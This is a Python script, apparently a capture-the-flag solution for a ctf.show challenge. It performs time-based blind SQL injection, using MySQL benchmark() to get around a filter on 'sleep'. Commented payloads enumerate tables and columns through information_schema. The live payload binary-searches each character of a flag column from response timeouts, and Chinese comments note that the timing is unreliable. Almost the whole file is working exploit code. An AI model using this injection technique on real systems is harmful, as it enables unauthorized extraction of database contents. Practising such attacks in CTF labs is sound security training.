"""
Author : feng
"""
import time
import threading
import requests

'''
查询语句

       where id = ($id);
      
返回逻辑

    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep/i',$str);
    }    


sleep被ban了就用benchmark。我也是第一次用benchmark进行时间盲注，属实感受到了这个玩意贼耗时间，
它比较容易受网速还有服务器那边的响应的影响，一条benchmark，有时候跑2秒，有时候0.几秒，而且越跑到后面误差越大
'''

url = "http://0aa7f462-9fb2-4687-aa6b-8c7a3904b283.chall.ctf.show:8080/api/index.php"
flag = ''
for i in range(1, 100):
    # lock = threading.Lock()
    min = 32
    max = 128

    while 1:
        # lock.acquire()
        j = min + (max - min) // 2
        if j == min:
            flag += chr(j)
            print(flag)
            if chr(j) == '}':
                exit()
            break
        # payload = "1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
        # ctfshow_flagxccb,ctfshow_info
        # payload = "1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
        # id,flagaabc,info
        # 不能一次查完越到后面越不准确
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb limit 0,5),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
        # ctfshow
        payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),{},1))<{},benchmark(3000000,md5(1)),1)#".format(
        # payload = "1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb limit 5,5),{},1))<{},benchmark(3480500,md5(1)),1)#".format(
            i, j)
        # ctfshow{359d7a0e000.0..00.-4e8c-464e-9ee6-f0804a7537db}
        # ctfshow{9154644a-9c42-
        # ctfshow{9154644a-9c42-488 %8 "e,%
        # ctfshow{dd4d5e26-53e4-43cb-8cfb-c5ae0149a093}
        data = {
            'ip': payload,
            'debug': 0
        }
        try:
            r = requests.post(url=url, data=data, timeout=2)
            time.sleep(1.2)
            min = j
        except:
            max = j
        time.sleep(0.3)
    time.sleep(1)
        # lock.release()

